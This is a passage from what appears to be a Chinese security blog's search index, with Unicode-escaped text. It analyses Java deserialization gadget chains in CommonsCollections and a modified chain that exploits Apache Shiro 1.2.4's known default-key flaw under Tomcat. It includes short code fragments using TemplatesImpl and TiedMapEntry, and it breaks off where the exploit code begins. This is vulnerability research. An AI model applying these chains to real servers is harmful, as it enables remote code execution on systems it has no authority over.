\u6700\u7ec8\u7684\u5229\u7528\u6548\u679c","text":"<p>\u5728\u5229\u7528\u94fe\u6784\u9020\u4e2d\uff0c\u6211\u4eec\u80af\u5b9a\u5e0c\u671b\u6700\u7ec8\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6216\u8005\u662f\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u6548\u679c\uff0c\u8fd9\u6837\u4f1a\u4f7f\u5f97\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5a01\u529b\u6700\u5927\u5316\u3002\u6240\u4ee5\u6211\u4eec\u5f88\u5f00\u5fc3\u80fd\u770b\u5230InvokerTransformer\u7684transform\u51fd\u6570\uff0c\u4ed6\u5229\u7528\u53cd\u5c04\u673a\u5236\u6765\u8c03\u7528\u4efb\u610f\u7684\u4ee3\u7801\uff0c\u4e5f\u610f\u5473\u7740\u6211\u4eec\u80fd\u63a7\u5236\u4efb\u610f\u7c7b\u7684\u8c03\u7528\u6267\u884c\u3002\u4f46\u662f\u5728\u5b9e\u9645\u7684\u6316\u6398\u4e2d\uff0c\u9664\u4e86\u5bf9\u53cd\u5c04\u673a\u5236\u7684\u6316\u6398\u548cdefineClass\u7c7b\u578b\u7684\u6316\u6398\uff0c\u6211\u4eec\u4e5f\u5e94\u8be5\u6ce8\u610f\u5230\u5176\u4ed6\u53ef\u80fd\u4f1a\u5b58\u5728\u7684\u5371\u9669\u5229\u7528\uff0c\u5982\u4efb\u610f\u6587\u4ef6\u5199\u5165\uff0c\u4efb\u610f\u6587\u4ef6\u5220\u9664\u7b49\u7b49\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#2","title":"2. \u5229\u7528\u94fe\u603b\u4f53\u7684\u4e00\u4e2a\u6316\u6398\u601d\u8def","text":"<p>\u6211\u4eec\u5728\u5206\u6790\u5b8c\u6240\u6709\u7684CommonsCollections\u7684payloads\u5f88\u5bb9\u6613\u53d1\u73b0\u7684\u4e00\u70b9\u662f\u5f88\u591apayloads\u201c\u6742\u4ea4\u201d\u7ec4\u5408\u4e86\u591a\u4e2a\u53ef\u5229\u7528\u7684\u8282\u70b9\u3002\u90a3\u4e48\u6211\u4eec\u5728\u5b9e\u9645\u7684\u6316\u6398\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u9996\u5148\u80fd\u83b7\u77e5\u54ea\u4e9b\u5e93\u6587\u4ef6\u91cc\u6709\u54ea\u4e9b\u53ef\u5229\u7528\u7684\u8282\u70b9\uff0c\u7136\u540e\u6839\u636e\u4e00\u5b9a\u7684\u89c4\u5219\u6765\u8fdb\u884c\u4e00\u4e2a\u94fe\u6761\u7684\u8fde\u63a5\u3002</p> <p>\u90a3\u4e48\u6765\u770b\u4e00\u4e0b\uff0c\u53ef\u5229\u7528\u7684\u8282\u70b9\u662f\u4ec0\u4e48\uff1f</p> <ol> <li>\u5b9e\u73b0\u4e86<code>Serializable</code>\u63a5\u53e3\uff0c\u679a\u4e3e\u51fa\u6240\u6709\u53ef\u4ee5\u88ab\u5e8f\u5217\u5316\u7684\u7c7b\u3002</li> <li>\u8be5\u7c7b\u7684\u7c7b\u5c5e\u6027\u505a\u4e86\u51fd\u6570\u8c03\u7528\u6216\u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u5982<code>TreeMap.map.put()</code>\u548c<code>ConstantTransformer.transform</code>\u76f4\u63a5\u8fd4\u56de<code>iConstant</code>\u7c7b\u5c5e\u6027\u3002\u5982\u679c\u4e0d\u5b58\u5728\u4e0a\u8ff0\u7684\u60c5\u51b5\uff0c\u6211\u4eec\u53ef\u4ee5\u5ffd\u7565\u3002</li> <li>\u5b9e\u73b0\u4e86<code>readObject</code>\u51fd\u6570\uff0c\u8fd9\u79cd\u60c5\u51b5\u53ef\u4f5c\u4e3a\u8d77\u59cb\u70b9\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u6865\u63a5\u70b9\uff0c\u9700\u8981\u5177\u4f53\u5224\u65ad\u5176\u4ee3\u7801\u7684\u5b9e\u73b0\u3002</li> <li>\u5b9e\u73b0\u4e86<code>invoke</code>\u51fd\u6570\uff0c\u8fd9\u79cd\u60c5\u51b5\u53ef\u4f5c\u4e3a\u6865\u63a5\u70b9\uff0c\u5229\u7528\u4e86\u4ee3\u7406\u673a\u5236\u3002</li> <li>\u4ece<code>readObject</code>\u51fd\u6570\u548c<code>invoke</code>\u51fd\u6570\uff0c\u884d\u751f\u51fa\u6765\u7684\u7c7b\u5c5e\u6027\u51fd\u6570\u8c03\u7528\uff0c\u8fd9\u8fb9\u53ef\u80fd\u4f1a\u5f15\u5411\u5176\u4ed6\u7684\u7c7b\u51fd\u6570\uff0c\u5982<code>TreeBag.readObject</code>\u7684\u5b9e\u73b0\uff0c\u5c06\u5f15\u5411\u4e0b\u4e00\u6b65\u7684\u7236\u7c7b\u51fd\u6570<code>doReadObject</code>\u51fd\u6570\u3002\u8fd9\u91cc\u5c31\u9700\u8981\u505a\u4e00\u4e2a\u4eba\u5de5\u6216\u8005\u662f\u9759\u6001\u7684\u4ee3\u7801\u5206\u6790\u3002</li> </ol> <p>\u63a5\u4e0b\u6765\uff0c\u5173\u4e8e\u53ef\u5229\u7528\u8282\u70b9\u7684\u4e32\u8054\uff0c\u5176\u5b9e\u4e3b\u8981\u4f9d\u8d56\u4e8e\u7b2c5\u70b9\u7684\u6316\u6398\uff0c\u6211\u4eec\u9700\u8981\u6839\u636e\u7ecf\u9a8c\u6216\u8005\u662f\u9759\u6001\u7684\u4ee3\u7801\u5206\u6790\u6765\u505a\u3002</p> <p>\u6839\u636e\u4e0a\u9762\u7684\u4e00\u4e2a\u5206\u6790\uff0c\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u505a\u5230\u4e00\u4e2a\u81ea\u52a8\u5316\u7684\u5229\u7528\u94fe\u53d1\u6398\uff0chttps://github.com/JackOfMostTrades/gadgetinspector</p> <p>\u8fd9\u4e2a\u5de5\u5177\u5c31\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u5b9e\u73b0\uff0c\u540e\u7eed\u5c06\u5bf9\u5176\u8fdb\u884c\u4e00\u4e2a\u5206\u6790\u3002</p> <p>\u4ececommons-collections\u7684\u9632\u62a4\u6765\u770b\uff0c\u6211\u4eec\u8d8a\u6765\u8d8a\u65e0\u6cd5\u5728\u5355\u4e2a\u5e93\u91cc\u9762\u5b9e\u73b0\u4e00\u4e2a\u53ef\u5229\u7528\u7684\u5229\u7528\u94fe\uff0c\u8fd9\u4e5f\u610f\u5473\u7740\u6211\u4eec\u9700\u8981\u5bf9\u4e0d\u540c\u7684\u9879\u76ee\u505a\u9488\u5bf9\u6027\u7684\u5206\u6790\uff0c\u6240\u4ee5gadetinspector\u8fd9\u4e2a\u5de5\u5177\u7684\u91cd\u8981\u6027\u5c31\u4e0d\u8a00\u800c\u55bb\u4e86\u3002\u4e0b\u4e00\u6b65\u5c06\u91cd\u70b9\u5206\u6790\u4e00\u4e0b\u8be5\u5de5\u5177\u7684\u5b9e\u73b0\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/","title":"Java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398\u4e4bShiro\u53cd\u5e8f\u5217\u5316","text":"","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#0x00","title":"0x00 \u524d\u8a00","text":"<p>\u5728\u8ddf\u4e86\u4e00\u904dcommons-collections\u7cfb\u5217\u7684payload\u540e\uff0c\u7ec8\u4e8e\u53ef\u4ee5\u5f00\u59cb\u89e3\u51b3\u4e00\u4e0b\u5f53\u65f6\u5bf9shiro\u53cd\u5e8f\u5217\u5316\u6a21\u51cc\u4e24\u53ef\u7684\u8ba4\u8bc6\u4e86\u3002</p> <p>\u5f53\u524d\uff0c\u4e0d\u7ba1\u662f\u56fd\u5185\u5b9e\u9645\u7684xx\u884c\u52a8\u8fd8\u662fctf\u6bd4\u8d5b\uff0cshiro\u53cd\u5e8f\u5217\u5316\u4f1a\u7ecf\u5e38\u770b\u5230\u3002\u4f46\u5728\u5b9e\u9645\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u65f6\u5019\uff0c\u4f1a\u53d1\u73b0\u6211\u4eec\u65e0\u6cd5\u5728tomcat\u4e0b\u76f4\u63a5\u5229\u7528shiro-sample\u4e2d\u7684<code>commons-collections:3.2.1</code>\uff082021-03-16\u66f4\u65b0\uff0c\u8fd9\u91cc\u7ecfp\u725b\u6307\u6b63\uff0cshiro\u5e76\u6ca1\u6709\u4f9d\u8d56cc\u5e93\uff0c\u8be6\u60c5\uff09\u3002</p> <p>\u6211\u4eec\u524d\u9762\u5df2\u7ecf\u5bf9commons-collections\u7cfb\u5217\u5229\u7528\u94fe\u7684\u5206\u6790\uff0c\u4eca\u5929\u5c31\u6765\u6839\u636e\u5b66\u5230\u7684\u77e5\u8bc6\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002</p> <p>\u672c\u6587\u8ba8\u8bba\u4e86shiro-1.2.4\u7248\u672c\u65e0\u6cd5\u76f4\u63a5\u5229\u7528\u73b0\u6709\u7684ysoserial\u5229\u7528\u94fe\uff0c\u5e76\u63d0\u51fa\u4e86\u76f8\u5e94\u7684\u89e3\u51b3\u65b9\u6848\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#0x01","title":"0x01 \u73af\u5883\u51c6\u5907","text":"<p>\u8fd9\u91cc\u7528\u7684\u662fshiro-root-1.2.4\u7684samples/web\u73af\u5883\uff0cclone\u4e0b\u6765\u540e\u6267\u884c<code>git checkout shiro-root-1.2.4</code></p> <p>\u5229\u7528\u811a\u672c\u53c2\u8003\u7684\u77e5\u9053\u521b\u5b87\u7684\u4e00\u7bc7\u5206\u6790</p> <p>ysoserial\u7528\u76840.0.6\u7248\u672c<code>https://github.com/frohoff/ysoserial</code></p> <p>\u5148\u6765\u8bb2\u4e00\u4e0b\uff0c\u5173\u4e8e\u73af\u5883\u65b9\u9762\u9047\u5230\u7684\u5751\uff1a</p> <ol> <li>\u5728\u90e8\u7f72\u8fc7\u7a0b\u4e2d\uff0c\u9047\u5230\u4e86The absolute uri: http://java.sun.com/jsp/jstl/core cannot be resolved in either web.xml or the jar files deployed with this application\u7684\u9519\u8bef</li> </ol> <p>\u8fd9\u91cc\u7684\u89e3\u51b3\u65b9\u6848\u662f\u4fee\u6539pom.xml</p> <p></p> <p>\u200b           \u6dfb\u52a0jstl\u7684\u5177\u4f53\u7248\u672c\u5373\u53ef\u89e3\u51b3\u3002</p> <ol> <li>serialVersionUID\u4e0d\u4e00\u81f4\u5bfc\u81f4\u65e0\u6cd5\u53cd\u5e8f\u5217\u5316\u7684\u95ee\u9898</li> </ol> <p>\u8fd9\u91cc\u53ef\u80fd\u5728\u4f60\u7684\u5b9e\u9a8c\u73af\u5883\u4e0b\u4e0d\u4e00\u5b9a\u4f1a\u9047\u5230\uff0c\u6211\u7684\u5b9e\u9a8c\u73af\u5883\u548cysoserial\u751f\u6210\u7684\u67d0\u51e0\u4e2a\u7c7b\u7684serialVersionUID\u4e0d\u4e00\u81f4\uff0c\u5bfc\u81f4\u65e0\u6cd5\u6b63\u5e38\u53cd\u5e8f\u5217\u5316\u3002\u5728\u5b9e\u6218\u4e2d\u4f60\u53ef\u4ee5\u91c7\u7528\u8fd9\u7bc7\u6587\u7ae0\u5904\u7406\u65b9\u6cd5\uff0c\u8fd9\u91cc\u6211\u7684\u89e3\u51b3\u65b9\u6848\u662f\u76f4\u63a5\u540c\u6b65\u4e2a<code>commons-collections:3.2.1</code>\u7248\u672c\uff0c\u5728\u751f\u6210war\u5305\u524d\uff0c\u5728pom.xml\u52a0\u5165</p> <pre><code>&lt;dependency&gt;\n  &lt;groupId&gt;commons-collections&lt;/groupId&gt;\n  &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;\n  &lt;version&gt;3.2.1&lt;/version&gt;\n  &lt;scope&gt;runtime&lt;/scope&gt;\n&lt;/dependency&gt;\n</code></pre>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#0x02","title":"0x02 \u524d\u666f\u56de\u987e","text":"<p>16\u5e74\u7684\u65f6\u5019\uff0cshiro\u7206\u51fa\u4e86\u4e00\u4e2a\u9ed8\u8ba4key\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u81f3\u4eca\u5df2\u6709\u5927\u91cf\u7684\u5206\u6790\u6587\u7ae0\u5206\u6790\u4e86\u8be5\u6f0f\u6d1e\u7684\u539f\u7406\uff0c\u6240\u4ee5\u672c\u6587\u4e0d\u518d\u91cd\u590d\u5206\u6790\u8be5\u6f0f\u6d1e\u7684\u76f8\u5173\u539f\u7406\uff0c\u53ef\u4ee5\u53c2\u8003\u4ee5\u4e0b\u51e0\u7bc7\u6587\u7ae0\u7684\u5206\u6790\uff1a</p> <ul> <li>1.https://blog.knownsec.com/2016/08/apache-shiro-java/</li> <li>2.https://blog.zsxsoft.com/post/35</li> <li>3.http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</li> </ul> <p>\u9664\u4e861\u4e2d\u5728\u6f0f\u6d1e\u73af\u5883\u4e0b\u6dfb\u52a0\u4e86<code>commons-collections:4.0</code>\uff0c\u53e6\u5916\u4e24\u7bc7\u6587\u7ae0\u5747\u63d0\u5230\u4e86\u5728tomcat\u4e0b\u65e0\u6cd5\u76f4\u63a5\u5229\u7528<code>commons-collections:3.2.1</code>\u7684\u95ee\u9898\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u6765\u770b\u770b\u662f\u4ec0\u4e48\u539f\u56e0\u5427\uff1a\uff09</p> <p><code>org.apache.shiro.io.DefaultSerializer.deserialize:67</code></p> <p></p> <p>\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u770b\u53cd\u5e8f\u5217\u5316\u53d1\u751f\u7684\u70b9\uff0c\u7b2c75\u884c\u4f7f\u7528\u4e86<code>ClassResolvingObjectInputStream</code>\u7c7b\u800c\u975e\u4f20\u7edf\u7684<code>ObjectInputStream</code>.\u8fd9\u91cc\u53ef\u80fd\u662f\u5f00\u53d1\u4eba\u5458\u505a\u7684\u4e00\u79cd\u9632\u62a4\u63aa\u65bd\uff1f\u4ed6\u91cd\u5199\u4e86<code>ObjectInputStream</code>\u7c7b\u7684<code>resolveClass</code>\u51fd\u6570\uff0c\u6211\u66fe\u5728\u7b2c\u4e00\u7bc7\u57fa\u7840\u6587\u7ae0\u4e2d\u5206\u6790\u8fc7Java\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\uff0c<code>ObjectInputStream</code>\u7684<code>resolveClass</code>\u51fd\u6570\u7528\u7684\u662f<code>Class.forName</code>\u7c7b\u83b7\u53d6\u5f53\u524d\u63cf\u8ff0\u5668\u6240\u6307\u4ee3\u7684\u7c7b\u7684Class\u5bf9\u8c61\u3002\u800c\u91cd\u5199\u540e\u7684<code>resolveClass</code>\u51fd\u6570</p> <p></p> <p>\u91c7\u7528\u7684\u662f<code>ClassUtils.forName</code>\uff0c\u6211\u4eec\u7ee7\u7eed\u770b\u8fd9\u4e2aforName\u7684\u5b9e\u73b0\u3002</p> <p></p> <p>\u6765\u770b\u770b\u8fd9\u4e2a<code>ExceptionIgnoringAccessor</code>\u662f\u600e\u4e48\u5b9e\u73b0\u7684</p> <p></p> <p>\u8fd9\u91cc\u5b9e\u9645\u4e0a\u8c03\u7528\u4e86<code>ParallelWebAppClassLoader</code>\u7236\u7c7b<code>WebappClassLoaderBase</code>\u7684<code>loadClass</code>\u51fd\u6570\uff08\u53ef\u4ee5\u76f4\u63a5\u4e0b\u65ad\u70b9\u770b\u770b\u5185\u5bb9\uff09\u3002</p> <p>\u8be5loadClass\u8f7d\u5165\u6309\u7167\u4e0a\u8ff0\u7684\u987a\u5e8f\uff08\u8fd9\u91cc\u4e0d\u8d34\u4ee3\u7801\u4e86\uff0c\u627e\u5230<code>org.apache.catalina.loader.WebappClassLoaderBase.loadClass</code>\u5373\u53ef\uff09\uff0c\u5148\u4ececache\u4e2d\u627e\u5df2\u8f7d\u5165\u7684\u7c7b\uff0c\u5982\u679c\u524d3\u70b9\u90fd\u6ca1\u627e\u5230\uff0c\u518d\u901a\u8fc7\u7236\u7c7b<code>URLClassLoader</code>\u7684<code>loadClass</code>\u51fd\u6570\u8f7d\u5165\u3002\u4f46\u662f\u5b9e\u9645\u4e0a\u6b64\u65f6loadClass\u7684\u53c2\u6570name\u503c\u5e26\u4e0a\u4e86\u6570\u7ec4\u7684\u6807\u5fd7\uff0c\u5373<code>/Lorg/apache/commons/collections/Transformer;.class</code>\uff0c\u5728\u53c2\u8003\u7684\u7b2c\u4e8c\u7bc7\u6587\u7ae0\u91cc\u6709\u63d0\u5230\u8fd9\u4e2a\u95ee\u9898\uff0c\u6240\u4ee5\u5bfc\u81f4shiro\u65e0\u6cd5\u8f7d\u5165\u6570\u7ec4\u7c7b\u578b\u7684\u5bf9\u8c61\u3002</p> <p>\u90a3\u4e48\u5982\u4f55\u624d\u80fd\u771f\u6b63\u7684\u5229\u7528<code>commons-collections:3.2.1</code>\u6765\u6784\u9020\u5229\u7528\u94fe\u5462\uff1f</p> <p>\u9996\u5148\uff0c\u5728\u53c2\u8003\u7684\u7b2c\u4e00\u7bc7\u6587\u7ae0\u91cc\uff0c\u4f5c\u8005\u5728\u73af\u5883\u4e2d\u5f15\u5165\u4e86<code>commons-collections:4.0</code>\uff0c\u4f7f\u5f97ysoserial\u7684<code>CommonsCollections2</code>\u5229\u7528\u94fe\u53ef\u4ee5\u6210\u529f\u5229\u7528\u3002\u8fd9\u662f\u56e0\u4e3a<code>CommonsCollections2</code>\u7528\u7684\u662f\u975e\u6570\u7ec4\u5f62\u5f0f\u7684\u5229\u7528\u94fe\uff0c\u5728\u8be5\u5229\u7528\u94fe\u4e0a\u6ca1\u6709\u51fa\u73b0\u6570\u7ec4\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u8fd9\u4f7f\u5f97\u5728shiro\u7684\u73af\u5883\u4e0b\uff0c\u53ef\u4ee5\u6b63\u786e\u6267\u884c\u547d\u4ee4\u3002</p> <p>\u90a3\u4e48\uff0c\u95ee\u9898\u6765\u4e86\uff0c\u6211\u4eec\u662f\u5426\u80fd\u6784\u9020\u51fa\u4e00\u4e2a\u5728<code>commons-collections:3.2.1</code>\u4e0b\u53ef\u4ee5\u5229\u7528\uff0c\u5e76\u4e14\u5728\u5229\u7528\u94fe\u4e0a\u4e0d\u5b58\u5728\u6570\u7ec4\u7c7b\u578b\u7684\u5bf9\u8c61\uff1f\u7b54\u6848\u5f53\u7136\u662f\u80af\u5b9a\u7684\uff1a\uff09</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#0x03","title":"0x03 \u65b0\u5229\u7528\u94fe\u6784\u9020","text":"<p>\u6839\u636e0x02\u7684\u4ecb\u7ecd\uff0c\u6211\u4eec\u53ef\u4ee5\u6e05\u695a\u7684\u662f\u5229\u7528\u94fe\u4e2d\u7684<code>ChainedTransformer</code>\u8fd9\u4e2a\u7c7b\u7684\u5229\u7528\u662f\u65e0\u6cd5\u6210\u529f\u7684\uff0c\u56e0\u4e3a\u4ed6\u7684\u7c7b\u5c5e\u6027<code>iTransformers</code>\u662f\u6570\u7ec4\u7c7b\u578b\u7684<code>Transformers</code>\uff0c\u4e5f\u5c31\u662f\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u53d1\u751f\u7684<code>ClassNotFoundException</code>\u3002</p> <p>\u5982\u679c\u4f60\u770b\u8fc7\u524d\u51e0\u7bc7\u5173\u4e8ecommons-collections\u7cfb\u5217\u7684payload\u5206\u6790\uff0c\u90a3\u4e48\u4f60\u80af\u5b9a\u53ef\u4ee5\u56de\u5fc6\u8d77\u6765\uff0c\u9664\u4e86\u5229\u7528<code>ChainedTransformer</code>\u8fd9\u79cd\u65b9\u5f0f\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528<code>TemplatesImpl.newTransformer</code>\u51fd\u6570\u6765\u52a8\u6001<code>loadClass</code>\u6784\u9020\u597d\u7684evil class bytes\uff08\u8fd9\u4e00\u90e8\u5206\u4e0d\u590d\u8ff0\u4e86\uff0c\u53ef\u4ee5\u770b\u524d\u9762\u7684\u6587\u7ae0\uff09\u3002\u5e76\u4e14\u5728\u8fd9\u90e8\u5206\u5229\u7528\u94fe\u4e0a\u662f\u4e0d\u5b58\u5728\u6570\u7ec4\u7c7b\u578b\u7684\u5bf9\u8c61\u7684\u3002</p> <p>\u90a3\u4e48\uff0c\u63a5\u4e0b\u6765\u7684\u91cd\u70b9\u5c31\u662f\u627e\u4e00\u4e2a\u5982\u4f55\u89e6\u53d1<code>TemplatesImpl.newTransformer</code>\u7684\u65b9\u6cd5\u4e86\uff1a\uff09</p> <p>\u6211\u4eec\u5148\u6765\u56de\u987e\u4e00\u4e0b<code>CommonsCollections2</code>\u7684\u5229\u7528\u94fe</p> <pre><code>PriorityQueue.readObject\n    -&gt; PriorityQueue.heapify()\n    -&gt; PriorityQueue.siftDown()\n    -&gt; PriorityQueue.siftDownUsingComparator()\n        -&gt; TransformingComparator.compare()\n            -&gt; InvokerTransformer.transform()\n                -&gt; TemplatesImpl.newTransformer()\n                ... templates Gadgets ...\n                    -&gt; Runtime.getRuntime().exec()\n</code></pre> <p>\u5728\u8fd9\u6761\u94fe\u4e0a\uff0c\u7531\u4e8eTransformingComparator\u57283.2.1\u7684\u7248\u672c\u4e0a\u8fd8\u6ca1\u6709\u5b9e\u73b0Serializable\u63a5\u53e3\uff0c\u5176\u57283.2.1\u7248\u672c\u4e0b\u662f\u65e0\u6cd5\u53cd\u5e8f\u5217\u5316\u7684\u3002\u6240\u4ee5\u6211\u4eec\u65e0\u6cd5\u76f4\u63a5\u5229\u7528\u8be5payload\u6765\u8fbe\u5230\u547d\u4ee4\u6267\u884c\u7684\u76ee\u7684\u3002</p> <p>\u90a3\u4e48\u5c31\u6765\u6539\u9020\u6539\u9020\u5427\uff01\u6211\u4eec\u5148\u5c06\u6ce8\u610f\u529b\u5173\u6ce8\u5728<code>InvokerTransformer.transform()</code>\u4e0a</p> <p></p> <p>\u8fd9\u91cc\u662f\u6700\u7ecf\u5178\u7684\u53cd\u5c04\u673a\u5236\u7684\u5199\u6cd5\uff0c\u6839\u636e\u4f20\u5165\u7684<code>input</code>\u5bf9\u8c61\uff0c\u8c03\u7528\u5176<code>iMethodName</code>\uff08\u53ef\u63a7\uff09\u3002\u90a3\u4e48\u5982\u679c\u6b64\u65f6\u4f20\u5165\u7684<code>input</code>\u4e3a\u6784\u9020\u597d\u7684<code>TemplatesImpl</code>\u5bf9\u8c61\u5462\uff1f</p> <p>\u5f88\u660e\u663e\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u5c06<code>iMethodName</code>\u7f6e\u4e3a<code>newTransformer</code>\uff0c\u4ece\u800c\u5b8c\u6210\u540e\u7eed\u7684templates gadgets\u3002</p> <p>\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u600e\u4e48\u5c06\u4f20\u5165\u7684<code>input</code>\u7f6e\u4e3a<code>TemplatesImpl</code>\u5bf9\u8c61\u5462\uff1f</p> <p>\u5728ysoserial\u7684\u5229\u7528\u94fe\u4e2d\uff0c\u5173\u4e8e<code>transform</code>\u51fd\u6570\u63a5\u6536\u7684<code>input</code>\u5b58\u5728\u4e24\u79cd\u60c5\u51b5\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#1chainedtransformer","title":"1.\u914d\u5408<code>ChainedTransformer</code>","text":"<p><code>InvokerTransformer</code>\u5f80\u5f80\u540c<code>ChainedTransformer</code>\u914d\u5408\uff0c\u5faa\u73af\u6784\u9020Runtimt.getRuntime().exec\u3002\u5f88\u660e\u663e\uff0c\u8fd9\u91cc\u6211\u4eec\u65e0\u6cd5\u5229\u7528\u4e86\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#2string","title":"2.\u65e0\u610f\u4e49\u7684<code>String</code>","text":"<p>\u8fd9\u91cc\u7684\u65e0\u610f\u4e49\u7684<code>String</code>\u6307\u7684\u662f\u4f20\u5165\u5230<code>ConstantTransformer.transform</code>\u51fd\u6570\u7684<code>input</code>\uff0c\u8be5<code>transform</code>\u51fd\u6570\u4e0d\u4f9d\u8d56<code>input</code>\uff0c\u800c\u76f4\u63a5\u8fd4\u56de<code>iConstant</code></p> <p>\u8fd9\u91cc\u7b2c\u4e00\u6761\u8def\u80af\u5b9a\u65ad\u4e86\uff0c\u90a3\u4e48\u5c31\u662f\u600e\u4e48\u5229\u7528\u8fd9\u4e2a\u65e0\u610f\u4e49\u7684<code>String</code>\u4e86\uff01</p> <p>\u4ece<code>CommonsCollection5</code>\u5f00\u59cb\uff0c\u51fa\u73b0\u4e86<code>TiedMapEntry</code>\uff0c\u5176\u4f5c\u4e3a\u4e2d\u7ee7\uff0c\u8c03\u7528\u4e86<code>LazyMap</code>\uff08map\uff09\u7684<code>get</code>\u51fd\u6570\u3002</p> <p>\u6765\u770b\u4e00\u770b</p> <p></p> <p>\u5176\u4e2d<code>map</code>\u548c<code>key</code>\u6211\u4eec\u90fd\u53ef\u4ee5\u63a7\u5236\uff0c\u800c<code>LazyMap.get</code>\u8c03\u7528\u4e86<code>transform</code>\u51fd\u6570\uff0c\u5e76\u5c06\u53ef\u63a7\u7684<code>key</code>\u4f20\u5165<code>transform</code>\u51fd\u6570</p> <p></p> <p>\u8fd9\u91cc\u5c31\u63a5\u4e0a\u4e86\u6211\u4eec\u524d\u9762\u8ba8\u8bba\u7684\uff0c\u5c06\u6784\u9020\u597d\u7684<code>TemplatesImpl</code>\uff08key\uff09\u4f5c\u4e3a<code>InvokerTransformer.transform</code>\u51fd\u6570\u7684<code>input</code>\u4f20\u5165\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06templates gadgets\u4e32\u8d77\u6765\u4e86\u3002</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u6211\u4eec\u5c06<code>CommonsCollections5,6,9</code>\u6784\u9020\u94fe\u4e2d\u7684<code>TiedMapEntry</code>\u7684key\u7528\u4e86\u8d77\u6765\u3002</p> <pre><code>final Object templates = Gadgets.createTemplatesImpl(command);\n// TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); //\u539f\u6765\u7684\u5229\u7528\u65b9\u5f0f\nTiedMapEntry entry = new TiedMapEntry(lazyMap, templates);\n</code></pre> <p>\u8fd9\u91cc\u5c06\u65e0\u610f\u4e49\u7684<code>foo</code>\u6539\u9020\u6210\u4e86\u89e6\u53d1<code>TemplatesImpl.newTransformer</code>\u7684trigger\u3002</p> <p>\u800c\u5728<code>TiedMapEntry</code>\u524d\u7684\u5229\u7528\u94fe\uff0c\u5728\u539f\u751fshiro\u73af\u5883\u4e0b\uff0c\u5e76\u4e0d\u51b2\u7a81\uff08\u6ca1\u6709\u6570\u7ec4\u7c7b\u578b\u7684\u5bf9\u8c61\uff09\uff0c\u53ef\u4ee5\u6b63\u5e38\u53cd\u5e8f\u5217\u5316\u3002\u8fd9\u4e00\u90e8\u5206\u5c31\u7701\u7565\u4e86\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#20200108","title":"20200108\u8865\u5145","text":"<p>\u5176\u5b9ecreateTemplatesImpl\u7684\u5229\u7528\u65b9\u5f0f\u4e2d\u8fd8\u662f\u5b58\u5728\u6570\u7ec4\u5f62\u5f0f\u7684\uff0cbyte[]\u6570\u7ec4\u7528\u4e8e\u5b58\u50a8evil class\u3002\u4f46\u662f\u5728tomcat 7\u53ca\u4ee5\u4e0a\u7684\u73af\u5883\u4e0b\uff0cjava\u7684\u539f\u751f\u6570\u636e\u7c7b\u578b\u7684\u6570\u7ec4\u8fd8\u539f\u4e0d\u5f71\u54cd\u53cd\u5e8f\u5217\u5316\uff0c\u53ea\u9488\u5bf9\u5bf9\u8c61\u7ea7\u522b\u7684\u6570\u7ec4\u8fd8\u539f\u3002\u800ctomcat6\u7684\u5b9e\u73b0\u65b9\u5f0f\u76f4\u63a5\u4e0d\u5141\u8bb8\u6570\u7ec4\u7c7b\u578b\u7684\u8fd8\u539f\uff0c\u4e5f\u5c31\u662f\u8bf4\u8be5\u5229\u7528\u94fe\u5728tomcat6\u7684\u73af\u5883\u4e0b\u662f\u6210\u529f\u4e0d\u4e86\u7684\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#20200109","title":"20200109\u8865\u5145","text":"<p>\u5f53\u5e94\u7528\u5f00\u542f\u4e86security manager\u65f6\uff0c\u9700\u8981\u8bbe\u7f6e<code>-Djdk.xml.enableTemplatesImplDeserialization=true</code></p> <p></p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#0x04-exp","title":"0x04 EXP\u7f16\u5199","text":"<p>\u8fd9\u91cc\u5176\u5b9e\u53ef\u4ee5\u6784\u9020\u51fa\u597d\u51e0\u4e2a\u94fe\uff0c\u6211\u8fd9\u91cc\u5c31\u62ff<code>HashSet</code>\u4e3a\u4f8b\uff0c\u5b8c\u6574\u7684exp\u89c1MyYsoserial\u4e2d\u7684<code>CommonsCollections10</code></p> <pre><code>final Object templates = Gadgets.createTemplatesImpl(command);// 